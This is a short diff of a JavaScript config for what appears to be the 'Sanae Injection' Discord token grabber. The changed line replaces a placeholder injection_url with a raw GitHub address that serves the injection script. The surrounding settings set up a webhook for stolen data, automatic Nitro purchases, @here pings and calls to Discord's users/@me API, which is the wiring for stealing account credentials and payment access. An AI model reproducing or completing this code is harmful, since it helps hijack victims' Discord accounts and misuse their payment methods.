@@ -10,7 +10,7 @@ const { exec } = require("child_process");
 
 const config = {
     auto_buy_nitro: true, ping_on_run: true, ping_val: "@here",
-    injection_url: 'https://example.com/inject.js', embed_color: '2895667',
+    injection_url: 'https://raw.githubusercontent.com/0xMeii/Sanae-Injection/main/injection.js', embed_color: '2895667',
     webhook: '%WEBHOOK%', embed_name: 'Sanae Injection - 0xMeii',
     embed_icon: 'https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430',
     api: "https://discord.com/api/v9/users/@me",
